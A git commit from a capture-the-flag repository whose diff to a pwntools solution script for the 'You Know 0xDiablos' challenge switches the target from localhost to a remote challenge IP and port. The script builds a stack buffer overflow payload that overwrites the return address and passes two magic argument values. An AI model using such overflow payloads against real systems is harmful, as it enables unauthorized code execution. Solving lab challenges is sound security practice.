2c259434b2c580bf181d5ec8826025ce1e2c1c31
ShundaZhang <zhangshunda@gmail.com>
2022-12-23 11:50:42 +0800

    Solved You Know 0xDiablos.

--- ctf/pwn/Youknow0xDiablos/dec.py
+++ ctf/pwn/Youknow0xDiablos/dec.py
@@ -1,7 +1,7 @@
 from pwn import *
 
 #io = process("./vuln")
-ip, port = "127.0.0.1", 1234 
+ip, port = "159.65.19.4", 30388
 io = remote(ip, port)
 
 payload = (180+4+4)*'A'+p32(0x080491e2)+4*'A'+p32(0xdeadbeef)+p32(0xc0ded00d)
